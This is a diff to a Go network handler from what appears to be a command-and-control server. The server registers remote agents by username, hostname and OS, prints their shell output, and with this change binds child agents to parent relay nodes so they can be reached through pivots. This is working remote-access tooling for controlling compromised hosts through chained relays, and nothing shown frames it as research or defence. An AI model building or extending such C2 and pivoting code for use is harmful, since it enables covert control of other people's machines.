@@ -1,3 +1,4 @@
+// file: new/core/network/connection.go
 package network
 
 import (
@@ -77,6 +78,21 @@ func handleConnection(conn net.Conn, registry *node.Registry) {
 			ParentID: payload.ParentID,
 		}
 		id := registry.Add(n)
+
+		if n.ParentID >= 0 {
+			if parentNode, ok := registry.Get(n.ParentID); ok {
+				payload := protocol.BindRelayConnPayload{ID: id} // ✅ FIXED
+				data, _ := json.Marshal(payload)
+				msg := protocol.Message{
+					Type:    protocol.MsgBindRelayConn,
+					Payload: data,
+				}
+				buf, _ := protocol.EncodeMessage(msg)
+				parentNode.Conn.Write(buf)
+				log.Printf("[*] Sent BindRelayConn to relay node %d for child ID %d", n.ParentID, id)
+			}
+		}
+
 		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)
 
 		go handleAgentMessages(n, registry)
@@ -116,6 +132,8 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
 		case protocol.MsgShell:
 			fmt.Print(string(msg.Payload))
+		case protocol.MsgBindRelayConn:
+			handleBindRelayConn(msg)
 		default:
 			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
 		}
